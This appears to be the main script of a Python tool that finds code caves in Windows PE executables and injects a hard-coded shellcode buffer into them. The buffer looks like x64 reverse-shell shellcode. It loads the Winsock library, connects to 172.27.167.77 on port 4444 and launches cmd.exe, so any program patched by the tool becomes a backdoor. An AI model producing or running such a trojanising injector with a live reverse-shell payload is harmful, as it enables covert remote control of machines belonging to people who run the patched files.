from utils.parser import PEParser
from utils.codecaver import CodeCaver
from utils.injector import ShellcodeInjector
from utils.logger import *
import sys

# Test shellcode (you can replace this with your own)
buf = b"\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x30\x4c\x8b\x0e\x4d"
buf+=b"\x8b\x09\x4d\x8b\x49\x10\xeb\x63\x41\x8b\x49\x3c\x4d\x31\xff\x41\xb7\x88\x4d\x01"
buf+=b"\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f\x18\x45\x8b\x77\x20\x4d\x01"
buf+=b"\xce\xe3\x3f\xff\xc9\x48\x31\xf6\x41\x8b\x34\x8e\x4c\x01\xce\x48\x31\xc0\x48\x31"
buf+=b"\xd2\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x44\x39\xc2\x75\xda\x45"
buf+=b"\x8b\x57\x24\x4d\x01\xca\x41\x0f\xb7\x0c\x4a\x45\x8b\x5f\x1c\x4d\x01\xcb\x41\x8b"
buf+=b"\x04\x8b\x4c\x01\xc8\xc3\xc3\x4c\x89\xcd\x41\xb8\x8e\x4e\x0e\xec\xe8\x8f\xff\xff"
buf+=b"\xff\x49\x89\xc4\x48\x31\xc0\x66\xb8\x6c\x6c\x50\x48\xb8\x57\x53\x32\x5f\x33\x32"
buf+=b"\x2e\x64\x50\x48\x89\xe1\x48\x83\xec\x20\x4c\x89\xe0\xff\xd0\x48\x83\xc4\x20\x49"
buf+=b"\x89\xc6\x49\x89\xc1\x41\xb8\xcb\xed\xfc\x3b\x4c\x89\xcb\xe8\x55\xff\xff\xff\x48"
buf+=b"\x31\xc9\x66\xb9\x98\x01\x48\x29\xcc\x48\x8d\x14\x24\x66\xb9\x02\x02\x48\x83\xec"
buf+=b"\x30\xff\xd0\x48\x83\xc4\x30\x49\x89\xd9\x41\xb8\xd9\x09\xf5\xad\xe8\x2b\xff\xff"
buf+=b"\xff\x48\x83\xec\x30\x48\x31\xc9\xb1\x02\x48\x31\xd2\xb2\x01\x4d\x31\xc0\x41\xb0"
buf+=b"\x06\x4d\x31\xc9\x4c\x89\x4c\x24\x20\x4c\x89\x4c\x24\x28\xff\xd0\x49\x89\xc4\x48"
buf+=b"\x83\xc4\x30\x49\x89\xd9\x41\xb8\x0c\xba\x2d\xb3\xe8\xf3\xfe\xff\xff\x48\x83\xec"
buf+=b"\x20\x4c\x89\xe1\x48\x31\xd2\xb2\x02\x48\x89\x14\x24\x48\x31\xd2\x66\xba\x11\x5c"
buf+=b"\x48\x89\x54\x24\x02\xba\xac\x1b\xa7\x4d\x48\x89\x54\x24\x04\x48\x8d\x14\x24\x4d"
buf+=b"\x31\xc0\x41\xb0\x16\x4d\x31\xc9\x48\x83\xec\x38\x4c\x89\x4c\x24\x20\x4c\x89\x4c"
buf+=b"\x24\x28\x4c\x89\x4c\x24\x30\xff\xd0\x48\x83\xc4\x38\x49\x89\xe9\x41\xb8\x72\xfe"
buf+=b"\xb3\x16\xe8\x99\xfe\xff\xff\x48\xba\x9c\x92\x9b\xd1\x9a\x87\x9a\xff\x48\xf7\xd2"
buf+=b"\x52\x48\x89\xe2\x41\x54\x41\x54\x41\x54\x48\x31\xc9\x66\x51\x51\x51\xb1\xff\x66"
buf+=b"\xff\xc1\x66\x51\x48\x31\xc9\x66\x51\x66\x51\x51\x51\x51\x51\x51\x51\xb1\x68\x51"
buf+=b"\x48\x89\xe7\x48\x89\xe1\x48\x83\xe9\x20\x51\x57\x48\x31\xc9\x51\x51\x51\x48\xff"
buf+=b"\xc1\x51\xfe\xc9\x51\x51\x51\x51\x49\x89\xc8\x49\x89\xc9\xff\xd0"


def main():
    if len(sys.argv) != 2:
        print("Usage: python main.py <path_to_pe_file>")
        sys.exit(1)

    pe_path = sys.argv[1]
    try:
        # Initialize components
        parser = PEParser(pe_path)
        caver = CodeCaver(parser)
        injector = ShellcodeInjector(parser, caver)


        # call_func_to_overwrite = parser.find_first_instruction("call", ".text", parser.pe.OPTIONAL_HEADER.AddressOfEntryPoint)
        # print(call_func_to_overwrite)
        # call_rva = parser.extract_offset_and_calculate_target(call_func_to_overwrite['bytes'], call_func_to_overwrite['address'])
        # print(f"CALL RVA: {hex(call_rva)}")

        # Print basic PE information
        print_header("PE File Analysis")
        architecture = parser.check_pe_architecture()
        print(f"Architecture: {architecture}")
    
        # Security features check
        print_section("Security Features", parser.check_security_features())
    
        # Basic headers
        print_section("File Headers", parser.get_file_headers())
    
        # Find code caves
        print_header("Code Cave Analysis")
        caves = caver.find_code_caves(min_size=100)
    
        # Filter and print only sections with caves
        cave_results = {
            section: [f"Offset: {hex(offset)}, Size: {size}"
                     for offset, size in caves_list]
            for section, caves_list in caves.items()
            if caves_list
        }
        print_section("Code Caves Found", cave_results)
    
        # Attempt shellcode injection
        print_header("Shellcode Injection")
        try:
            result = injector.inject_shellcode(buf)
            print_success("Shellcode injection completed")
            print_section("Injection Results", result)
        except Exception as e:
            print_error(f"Injection failed: {str(e)}")

    except Exception as e:
        print_error(f"Error analyzing PE file: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main() 